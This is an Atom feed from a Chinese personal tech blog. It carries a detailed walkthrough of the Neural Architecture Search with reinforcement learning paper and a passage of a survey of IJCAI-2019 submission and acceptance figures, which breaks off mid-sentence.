<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>止歌的博客</title>
  
  <subtitle>十年饮冰,难凉热血</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Wheeeeeeeeels.github.io/"/>
  <updated>2020-03-13T12:59:24.593Z</updated>
  <id>https://Wheeeeeeeeels.github.io/</id>
  
  <author>
    <name>止歌</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【论文解读】 Neural Architecture Search with reinforcement learning</title>
    <link href="https://Wheeeeeeeeels.github.io/2020/03/13/%E3%80%90%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB%E3%80%91%E4%BD%BF%E7%94%A8%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%BF%9B%E8%A1%8CNAS/"/>
    <id>https://Wheeeeeeeeels.github.io/2020/03/13/【论文解读】使用强化学习进行NAS/</id>
    <published>2020-03-13T11:45:34.000Z</published>
    <updated>2020-03-13T12:59:24.593Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要为Neural Architecture Search with reinforcement learning的详细解读</p><a id="more"></a><h3 id="【论文解读】-Neural-Architecture-Search-with-reinforcement-learning"><a href="#【论文解读】-Neural-Architecture-Search-with-reinforcement-learning" class="headerlink" title="【论文解读】 Neural Architecture Search with reinforcement learning"></a>【论文解读】 Neural Architecture Search with reinforcement learning</h3><hr><p>论文作者：Barret Zhph*,Quoc V.Le [来自于 Google Brain]</p><p>论文标题：Neural Architecture Search with reinforcement learning/(使用强化学习进行神经网络架构搜索)</p><p>论文会议：ILCR 2017</p><p>论文链接：<a href="https://arxiv.org/abs/1611.01578" target="_blank" rel="noopener">https://arxiv.org/abs/1611.01578</a></p><p>论文代码: <a href="https://github.com/tensorflow/models" target="_blank" rel="noopener">https://github.com/tensorflow/models</a></p><h2 id="1-概述与介绍"><a href="#1-概述与介绍" class="headerlink" title="1. 概述与介绍"></a>1. 概述与介绍</h2><hr><p>虽然神经网络却得了巨大的成功和发展在过去几年，从 SIFT 与 HOG,到 AlexNet,VGGNet,GoogleNet<br>但是想要设计一种神经网络模型仍然需要很多的专业背景知识和时间，本片文章提出了一种叫做 NAS(Neural Architecture Search)<br>的方法，这种方法基于梯度，用于找到非常好的 Architecture。NAS 的结构如下图所示:</p><p><img src="https://img-blog.csdnimg.cn/20200313194919203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><ul><li>本文提出的方法:<ul><li>使用 RNN 去生成神经网络的模型</li><li>同时使用强化学习去训练 RNN，从而希望最大化生成的架构在验证集上的最大化。</li></ul></li><li>本文现在达到的结果:<ul><li>计算机视觉任务: - CIFAR-10 数据集上: - test error rate: 0.09 的提升，速度是 1.05 倍更快 - 自然语言处理任务: - Penn Treebank dataset<sup>[1]</sup>: - 提出的新的 recurrent cell 超过 LSTM,还有 baseline </li><li>新的 cell 在 perplexity<sup>[2]</sup>上相比较 state-of-the-art 有 3.6 的提升<ul><li>PTB 数据集: - 在字符级别的语言模型任务上也是达到了 state-of-the-art</li></ul></li></ul></li></ul><ul><li>具体的做法： 主要就是将神经网络模型具体到变成一个可变长度的字符串，所以便于使用 RNN(控制器的作用)来生成字符串.<br>用于构建网络。之后训练该网络，并用网络的 accuracy 作为 reward 返回给控制器来更新控制器的参数，达到更优的策略。</li></ul><h2 id="2-相关工作"><a href="#2-相关工作" class="headerlink" title="2. 相关工作"></a>2. 相关工作</h2><hr><h3 id="Point1-超参数优化"><a href="#Point1-超参数优化" class="headerlink" title="Point1: 超参数优化"></a>Point1: 超参数优化</h3><p><b>Hpyerparameter optimization</b>在过去取得了很多的应用与成功，但是只能限制于固定长度的空间<br>中，生成一个规定网络结构和连接性的可变长度配置很困难。在实践中，如果这些方法提供了良好的初始模型这些方法往往会更好地工作</p><p>(1) 早期的解决方式: 使用贝叶斯优化方法,可以用来搜索非定长的 architecture</p><p>(2) 与本文的方法相比: 贝叶斯优化方法实在是不够通用与灵活</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Something we Should know:</span><br><span class="line"></span><br><span class="line">神经网络训练是由于许多超参数决定的:网络深度，学习率，卷积核大小，那么如何获得一个更好的</span><br><span class="line">超参数组合? 常用的就是Grid Search,Random Search以及贝叶斯优化搜索</span><br><span class="line"></span><br><span class="line">1. Grid Search: 其实就是穷举搜索 超参数的组合全部实现不够现实，所以事先限定各种可能，效率低</span><br><span class="line">2. Random Search: 缺点是，随机搜索的结果互相之间差异很大，但是比Grid Search高效</span><br><span class="line"></span><br><span class="line">贝叶斯优化：https://www.cnblogs.com/marsggbo/p/9866764.html</span><br></pre></td></tr></table></figure><h3 id="Point2-现代神经进化算法"><a href="#Point2-现代神经进化算法" class="headerlink" title="Point2: 现代神经进化算法"></a>Point2: 现代神经进化算法</h3><p><b>Modern neuo-evolution algorithms</b> 在组成新的模型的时候很灵活，但是在大规模的时候<br>不够实用，限制主要在于是基于搜索的算法，所以运行的时候很慢同时需要启发式才能够 work well</p><h3 id="Point3-神经架构搜索"><a href="#Point3-神经架构搜索" class="headerlink" title="Point3: 神经架构搜索"></a>Point3: 神经架构搜索</h3><p><b>Neural Archhitecture Search</b> 与程序合成和归纳编程有一些相似之处，它们从例子中搜<br>索程序。在机器学习中，概率性程序引导已成功用于许多环境中，比如解决简单问答，<br>对列表数字排序，并以少样本进行学习。</p><h3 id="Point4-idea-的产生以及我们做了什么"><a href="#Point4-idea-的产生以及我们做了什么" class="headerlink" title="Point4: idea 的产生以及我们做了什么!"></a>Point4: idea 的产生以及我们做了什么!</h3><p>神经架构搜索中的控制器是自回归的，自回归就是预测一次的超参数，以先前的预测为条件。<br>这个 idea 是借鉴了端到端序列译码器对序列学习的思想。与 seq2seq learning 不同，<br>我们的方法优化了一个不可微的目标,child network 的 accuracy。<br>类似于神经机器翻译中的 BLEU<sup>[3]</sup>优化工作。与这些方法不同，<br>我们的方法直接从奖励信号中学习，并且没有使用有监督的 bootstrapping(自助采样方法)</p><p>与我们的工作相关的还有学习学习或元学习<sup>[4]</sup>的 idea<br>这是一个使用在一项任务中学到的信息来改进未来任务的通用框架。<br>更密切相关的是使用神经网络学习另一网络的梯度下降更新<br>以及使用强化学习为另一网络找到更新策略的想法。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">端到端与非端到端：</span><br><span class="line">相对于深度学习，传统机器学习的流程往往由多个独立的模块组成，比如在一个典型的自然语言处理（Natural Language Processing）问题中，包括分词、词性标注、句法分析、语义分析等多个独立步骤，每个步骤是一个独立的任务，其结果的好坏会影响到下一步骤，从而影响整个训练的结果，这是非端到端的。</span><br><span class="line">而深度学习模型在训练过程中，从输入端（输入数据）到输出端会得到一个预测结果，与真实结果相比较会得到一个误差，这个误差会在模型中的每一层传递（反向传播），每一层的表示都会根据这个误差来做调整，直到模型收敛或达到预期的效果才结束，这是端到端的。</span><br><span class="line">两者相比，端到端的学习省去了在每一个独立学习任务执行之前所做的数据标注，为样本做标注的代价是昂贵的、易出错的。</span><br></pre></td></tr></table></figure><h2 id="3-方法-METHODS"><a href="#3-方法-METHODS" class="headerlink" title="3. 方法 METHODS"></a>3. 方法 METHODS</h2><hr><h3 id="Section-1-使用-RNN-作为控制器来生成模型描述"><a href="#Section-1-使用-RNN-作为控制器来生成模型描述" class="headerlink" title="Section 1. 使用 RNN 作为控制器来生成模型描述"></a>Section 1. 使用 RNN 作为控制器来生成模型描述</h3><p>下图所示是论文中提到如何使用 RNN 去预测生成一个简单的 conv 层的超参数</p><p><img src="https://img-blog.csdnimg.cn/20200313194940753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><ul><li>上图中预测的网络知识包括 conv 层，使用 RNN 预测生成 conv 层的超参数，主要包括<br>卷积核的 height,卷积核的 Width,卷积核滑动 stride 的 Height，卷积核滑动 stride 的 Width</li><li>实验当中终止的条件是当网络层数达到一个值的时候就会停止</li><li>控制器生成一个网络结构后，使用训练数据集进行训练直到达到收敛，然后再 hand-out 验证集上进行测试<br>得到一个准确率。</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hand-out validation set: 实际上就是留出的验证集，将数据集分为训练集S，和测试集T,同时两个集合互斥</span><br></pre></td></tr></table></figure><h3 id="Section-2-使用强化学习的思想进行训练"><a href="#Section-2-使用强化学习的思想进行训练" class="headerlink" title="Section 2. 使用强化学习的思想进行训练"></a>Section 2. 使用强化学习的思想进行训练</h3><p>(1) 主要是思想为: RNN 的参数使用$\theta_{c}$表示,$controller$所预测的一系列$tokens$记为一系列的$actions$,<br>即$a_{1:T}$,这些 tokens 是为了$Child network$,子网络再验证集上得到的准确率用$R$进行表示，这种准确率称为<br>$reward signal$,并且使用强化学习来训练$controller$</p><p>(2) 目标函数: 如下图所示，实际上就是需要$maximize reward$来找到最优的结构</p><p><img src="https://img-blog.csdnimg.cn/20200313195003142.png" alt></p><p>由于奖励信号 R 是不可微分的，因此使用策略梯度迭代的去更新$\theta_{c}$,在本文中，使用到来自 $Williams (1992)$ 的强化学习规则<br>如下图所示</p><p><img src="https://img-blog.csdnimg.cn/20200313195013314.png" alt></p><p>对于上面这个等式实际上就约等于如下所示的等式:</p><p><img src="https://img-blog.csdnimg.cn/20200313195040323.png" alt></p><p>公式推导如下所示:</p><p><img src="https://img-blog.csdnimg.cn/20200313195055592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200313195109208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p><img src="https://img-blog.csdnimg.cn/20200313195118926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">公式参数解读:</span><br><span class="line">m:是控制器在一个batch中采样得到的结构数量</span><br><span class="line">T:是controller用于预测和设计神经网络结构的超参数的数量</span><br><span class="line">R_k表示第k个网络结构在验证集上的准确度</span><br></pre></td></tr></table></figure><p>上述的更新算法是对梯度的无偏估计，但是缺点在于方差太高，解决方法如下图所示，采用了一个 baseline 函数</p><p><img src="https://img-blog.csdnimg.cn/20200313195555781.png" alt></p><p>其中$b$不依赖于当前的 action，那么其仍是无偏梯度估计，且$b$是前面结构准确度的指数平均指标(Exponential Moving Average,EMA)</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">无偏估计:无偏估计是用样本统计量来估计总体参数时的一种无偏推断。估计量的数学期望等于被估计参数的真实值，则称此估计量为被估计参数的无偏估计，即具有无偏性，是一种用于评价估计量优良性的准则。无偏估计的意义是：在多次重复下，它们的平均数接近所估计的参数真值。无偏估计常被应用于测验分数统计中。</span><br><span class="line"></span><br><span class="line">EMA（Exponential Moving Average）是指数平均数指标，它也是一种趋向类指标，指数平均数指标是以指数式递减加权的移动平均。</span><br><span class="line">用在这里的目的就是第i步的梯度下降的步长种增加了权重系数，相当于做了一个learning rate decay.</span><br></pre></td></tr></table></figure><p>(3) 使用并行算法和异步来进行加速学习(氪金的味道,Google 亲爹)</p><p>每一次用于更新 controller 的参数$\theta_{c}$的梯度都对应于一个子网络训练达到收敛。但是因为子网络众多，<br>且每次训练收敛耗时长，所以使用 分布式训练和异步参数更新的方法来加速 controller 的学习速度。具体结构如下<br>图所示:</p><p><img src="https://img-blog.csdnimg.cn/20200313195137563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p>主要就是有 S 个 Parameter Server 用于存储 K 个 Controller 复制体的共享参数，然后然后每个<br>Controller Replica 生成 m 个并行训练的自网络。</p><p>controller 会根据 m 个子网络结构在收敛时得到的结果收集得到梯度值，然后为了更新所有 Controller Replica，会把梯度值传递给 Parameter Server。<br>在本文中，当训练迭代次数超过一定次数则认为子网络收敛。</p><h3 id="Section-3-使用跳跃连接和其他-Layer-Types-来提升架构的复杂度"><a href="#Section-3-使用跳跃连接和其他-Layer-Types-来提升架构的复杂度" class="headerlink" title="Section 3: 使用跳跃连接和其他 Layer Types 来提升架构的复杂度"></a>Section 3: 使用跳跃连接和其他 Layer Types 来提升架构的复杂度</h3><p>这个 Section 实际就是讲需要使用 Skip ConnecionS(ResNet 结构)和 branching Layers(层分叉,GoogleNet 结构)。<br>同时为了准确预测 connections，本文使用了基于注意力机制的 set-selection type attenion 方法。</p><p>方法:</p><p>(1)每个 layer 添加一个 anchor point, 则经过 anchor point, RNN Controller 有一个 hidden state $h_i$</p><p>(2)在 N 层，根据 sigmoid 函数采样 j 是否连接到 i layer,sigmoid 函数如下所示:</p><p><img src="https://img-blog.csdnimg.cn/20200313195230334.png" alt></p><p>上式中$W_{curr},W_{prev},v$是可以学习的参数</p><p>下图实质表示的是如何使用 $skip connections$ 去决定那一层是其想要输入的当前层</p><p><img src="https://img-blog.csdnimg.cn/20200313195303794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p>在本文当中对几个问题进行了处理:</p><p>(1) 如果没有输入，那么原始图像作为输入，看成是 $input layer$</p><p>(2) $layer$ 输出可能没被送到任何其他 $layers$：都送到$classifier$</p><p>(3) 如果需要 $concatenated$ 的输入层有不同的$size$，那么小一点的层通过补 0 来保证一样大小</p><p>添加其他类型 $layers$</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pooling, batchnorm, 甚至是Learning rate</span><br></pre></td></tr></table></figure><p>RNN Controller 首先预测 layer type，再预测相关的 hyperparameters</p><h3 id="Section-4-生成-RECURRENT-CELL-架构"><a href="#Section-4-生成-RECURRENT-CELL-架构" class="headerlink" title="Section 4: 生成 RECURRENT CELL 架构"></a>Section 4: 生成 RECURRENT CELL 架构</h3><p>主要是讲如何生成递归单元结构的具体细节，使用树结构来描述网络结构，这样也便于便利结点<br>，其中每棵树由两个叶子节点(0,1)和中间节点(用 2 表示)组成.这种结构也可以称为”base 2”结构。<br>具体如下所示:</p><p><img src="https://img-blog.csdnimg.cn/2020031319531972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><h2 id="4-实验与结果"><a href="#4-实验与结果" class="headerlink" title="4. 实验与结果"></a>4. 实验与结果</h2><hr><ul><li><p>主要是在 CIFAR-10 数据集上进行图像分类以及在 Penn Treebank 上进行 language modeling 任务</p></li><li><p>其中数据集,baseline 模型以及超参设置，具体可见论文。</p></li></ul><h2 id="5-结论与总结"><a href="#5-结论与总结" class="headerlink" title="5.结论与总结"></a>5.结论与总结</h2><hr><p>(1) NAS 在生成网络的时候之前需要固定网络的结构，或者是说需要固定网络的层数。</p><p>(2) 以生成 CNN 网络为例，代码中默认最大层数参数 max_layers=2,当然也可以人为修改。</p><p>(3) 而 controller 其实就是一个 RNN 网络，其输出数据表示某一层中各个节点的参数，各个参数是按顺序输出的。<br>例如代码中是按照[cnn_filter_size,cnn_num_filters,max_pool_ksize,cnn_dropout_rates] 输出。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">伪代码:</span><br><span class="line"></span><br><span class="line">state = np.array([[10.0, 128.0, 1.0, 1.0]*max_layers], dtype=np.float32) # 初始化state</span><br><span class="line">for episode in range(MAX_EPISODES):</span><br><span class="line">action = RLnet.get_action(state)  # 强化学习网络根据当前状态获取下一步的动作，其中是使用原论文所给的NAScell来对动作进行预测的。</span><br><span class="line">reward, pre_accuracy = net_manager.get_reward(action) # 根据生成的动作得到对应的网络，然后将该网络在训练集上训练至收敛，再将收敛后的网络在验证集上运行得到准确度，根据一定的准则将准确度转化为reward。</span><br><span class="line">reward = update(reward) # 更新reward</span><br><span class="line">state = update(action) # 根据action更新state，在例子中是state=action[0]</span><br></pre></td></tr></table></figure><p>从上面的伪代码可以看出每次采样得到的模型都需要在训练集上训练到收敛，然后再根据在验证集上得到的 reward 更新。所以 NAS 其本质是在离散搜索空间进行搜索，<br>而且网络拓扑结构是固定的，并且训练时间较长。</p><p><img src="https://img-blog.csdnimg.cn/20200313195335967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><p>代码复现:<a href="https://github.com/wallarm/nascell-automl" target="_blank" rel="noopener">https://github.com/wallarm/nascell-automl</a></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一些内容的解释：</span><br><span class="line">[1] Penn Treebank dataset: 预料来自于华尔街日报，对预料进行标注，标注性内容包括词性分析标注以及句法分析</span><br><span class="line">[2] perplexity:困惑度，每个时间步根据语言模型计算的概率分布随机挑词，那么平均情况下，挑多长时间才能挑来正确的那个</span><br><span class="line">[3] BLEU:bilingual evaluation understudy，即：双语互译质量评估辅助工具。它是用来评估机器翻译质量的工具,BLEU的设计思想与评判机器翻译好坏的思想是一致的：机器翻译结果越接近专业人工翻译的结果，则越好。BLEU算法实际上在做的事：判断两个句子的相似程度。我想知道一个句子翻译前后的表示是否意思一致，显然没法直接比较，那我就拿这个句子的标准人工翻译与我的机器翻译的结果作比较，如果它们是很相似的，说明我的翻译很成功。因此，BLUE去做判断：一句机器翻译的话与其相对应的几个参考翻译作比较，算出一个综合分数。这个分数越高说明机器翻译得越好。（注：BLEU算法是句子之间的比较，不是词组，也不是段落）</span><br><span class="line">[4] 元学习:Meta Learning 元学习或者叫做 Learning to Learn 学会学习.元学习通常被用在：优化超参数和神经网络、探索好的网络结构、小样本图像识别和快速强化学习等。</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">论文写作鉴赏:</span><br><span class="line">  start from scratch: 白手起家</span><br><span class="line">  paradigm sift: 范式转移，形容变革</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参考文献:</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/stay_foolish12/article/details/91554801</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/Lucifer_zzq/article/details/83188462</span><br><span class="line"></span><br><span class="line">https://www.zhihu.com/question/50454339/answer/257372299</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/54361495</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/4c17bef0ff85#fnref3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要为Neural Architecture Search with reinforcement learning的详细解读&lt;/p&gt;
    
    </summary>
    
      <category term="论文解读" scheme="https://Wheeeeeeeeels.github.io/categories/%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB/"/>
    
    
      <category term="强化学习" scheme="https://Wheeeeeeeeels.github.io/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="AutoML" scheme="https://Wheeeeeeeeels.github.io/tags/AutoML/"/>
    
      <category term="机器学习" scheme="https://Wheeeeeeeeels.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Machine Learning" scheme="https://Wheeeeeeeeels.github.io/tags/Machine-Learning/"/>
    
      <category term="RNN" scheme="https://Wheeeeeeeeels.github.io/tags/RNN/"/>
    
  </entry>
  
  <entry>
    <title>【论文调研】IJCAI-2019 论文投稿与录用调研报告</title>
    <link href="https://Wheeeeeeeeels.github.io/2020/03/13/%E3%80%90%E8%AE%BA%E6%96%87%E8%B0%83%E7%A0%94%E3%80%91IJCAI-2019/"/>
    <id>https://Wheeeeeeeeels.github.io/2020/03/13/【论文调研】IJCAI-2019/</id>
    <published>2020-03-13T11:41:34.000Z</published>
    <updated>2020-03-13T12:54:58.278Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【论文调研】IJCAI-2019-论文投稿与录用调研报告"><a href="#【论文调研】IJCAI-2019-论文投稿与录用调研报告" class="headerlink" title="【论文调研】IJCAI-2019 论文投稿与录用调研报告"></a>【论文调研】IJCAI-2019 论文投稿与录用调研报告</h3><hr><p>本文主要为IJCAI-2019 论文投稿与录用调研报告</p><a id="more"></a><p><img src="https://img-blog.csdnimg.cn/20200313193528357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><h2 id="1-IJCAI会议简介"><a href="#1-IJCAI会议简介" class="headerlink" title="1. IJCAI会议简介"></a>1. IJCAI会议简介</h2><hr><ul><li>IJCAI 全称为Internation Joint Conference on Artifical Intelligence(国际人工智能联合会议)。</li><li>IJCAI是人工智能领域种最主要的学术会议之一，成立于1969年，地点位于美国加州。</li><li>IJCAI举办时间:自1969年以来奇数年每两年举办一次，2015年之后改为每年一届，其中2019年的IJCAI在中国澳门进行，而2020年的IJCAI将在日本名古屋进行。</li><li>每届IJCAI会议都会收录大量的高质量的论文，为了表彰一些学者在人工智能领域的突出贡献，<br>大会设定了4个奖项，分别为杰出研究奖、计算机与思想奖、约翰麦卡锡奖、唐纳德·沃克杰出服务奖，以此来表彰专家学者对该领域的服务和贡献。下面就来简单介绍一下每个奖项。</li><li>IJCAI历年投稿2019年止论文的投稿情况大体情况如下图所示:</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">关于IJCAI设定的4个奖项:</span><br><span class="line"></span><br><span class="line">1. 杰出研究奖</span><br><span class="line">该奖项每年授予一位科学家，表扬其在整个职业生涯中开展的具有高质量且持续性的研究，</span><br><span class="line">并且取得了实质性成果。过去获得这一荣誉的都是人工智能领域最杰出的学者、科学家。</span><br><span class="line">该奖项开始于1985年，第一位获得该殊荣的是John McCarthy，他也被称为“人工智能之父”。</span><br><span class="line">直至2018年，共有18位学者荣获该奖项。</span><br><span class="line"></span><br><span class="line">2. 计算机与思想奖</span><br><span class="line">计算机与思想奖在IJCAI会议上颁发给杰出的人工智能青年科学家。</span><br><span class="line">该奖项是由Edward Feigenbaum和Julian Feldman编辑的计算机与思想书中收取的版税而设立的。</span><br><span class="line">它目前得到IJCAI基金的收入支持。该奖项于1971年开始，第一位获得该殊荣的是Jitendra Malik，</span><br><span class="line">直至2018年，共有29位学者荣获该奖项。</span><br><span class="line"></span><br><span class="line">3. 约翰麦卡锡奖</span><br><span class="line">约翰麦卡锡奖旨在表彰公认的中期研究人员，通常是在获得博士学位15至25年后，这些研究人员在人</span><br><span class="line">工智能领域建立了卓越的研究成果。这个奖项是以约翰麦卡锡(1927-2011)命名的，</span><br><span class="line">他被公认为人工智能领域的创始人之一。麦卡锡不仅给这门学科起了名字，还对计算机科学，</span><br><span class="line">尤其是人工智能做出了持久重要的基本贡献，包括分时操作系统、LISP编程语言、知识表示、</span><br><span class="line">常识推理和人工智能的逻辑学范式。该奖项是在麦卡锡家族的全力支持和鼓励下设立的。</span><br><span class="line">该奖项于2015年开始至今，共有四位学者获此殊荣。</span><br><span class="line"></span><br><span class="line">4.唐纳德·沃克杰出服务奖</span><br><span class="line">唐纳德·沃克杰出服务奖由IJCAI董事会于1979年设立，以表彰AI的资深科学家在其职业生涯</span><br><span class="line">中对该领域的贡献和服务。直至2018年，共有17位学者获此殊荣。</span><br></pre></td></tr></table></figure><h2 id="2-IJCAI-2019会议整体分析"><a href="#2-IJCAI-2019会议整体分析" class="headerlink" title="2. IJCAI-2019会议整体分析"></a>2. IJCAI-2019会议整体分析</h2><hr><p>IJCAI-2019会议于2019年8月10日在中国澳门举行，为期七天,这是继2013年第23届IJCAI会议在北京举办过后，又一次在中国举办。</p><h3 id="1-论文投稿情况分析"><a href="#1-论文投稿情况分析" class="headerlink" title="1. 论文投稿情况分析"></a>1. 论文投稿情况分析</h3><ul><li>2019的IJCAI 会议共收到论文4752篇，最终收录的论文为847篇，接收率为 17.9% 。<br>论文提交量和录取量都创历史新高，但录取比率却是近10年最低。</li><li>今年 IJCAI 的投稿总数相较于去年增加了约 37%（1282篇），而录取数仅比去年多了141篇，<br>因此，录取率降低也就不足为奇。下图为1997年至今各届会议论文提交量、录取量以及录取比例。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200313193554782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNTkyNTgz,size_16,color_FFFFFF,t_70" alt></p><ul><li>在2019年收录的 847 篇论文中，有 327 篇来自中国，占比 38%。</li><li>插曲:2019年的评审、打分、rebuttal等环节不专业出现了严重甚至是可笑的“错误”。主要原因是采用了<br>学生审稿从而导致审稿不专业，审稿意见水品不高等问题。对于作者们的反应和评论，IJCAI 2019 的 PC （program chair，程序主席）Sarit Kraus 给作者们发送了一封邮件，做出了解释，给出了比较中肯的回复，这也得到了不少学者的支持。小编认为，这个问题也反映了近年来不少学者往一些顶级会议投一些水平较低论文，<br>这种“灌水”的行为也是导致论文录用率较低的主要原因，这次事件也值得各个领域的学者反思和借鉴。</li><li>在最新的2020年投稿中还未进评审则被拒，近半投稿遭Summary reject</li><li>IJCAI-2019 投递组织分析，如下所示</li></ul><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">【会议审稿流程的简单描述】:</span><br><span class="line"></span><br><span class="line">1. 对于会议审稿流程而言，由于会议论文往往有比较严格的截止日期（Deadline），</span><br><span class="line">作者们通常会根据这一时间来rush自己的paper,待deadline一过，大会的程序委员会主席</span><br><span class="line">（Program Committee Chair或Program Chair）首先会剔除一批不符合会议投稿政策的论文，</span><br><span class="line">如：篇幅不合要求、一稿多投、未匿名、未注明Conflict Domain等，</span><br><span class="line">这些论文会直接作“Desk 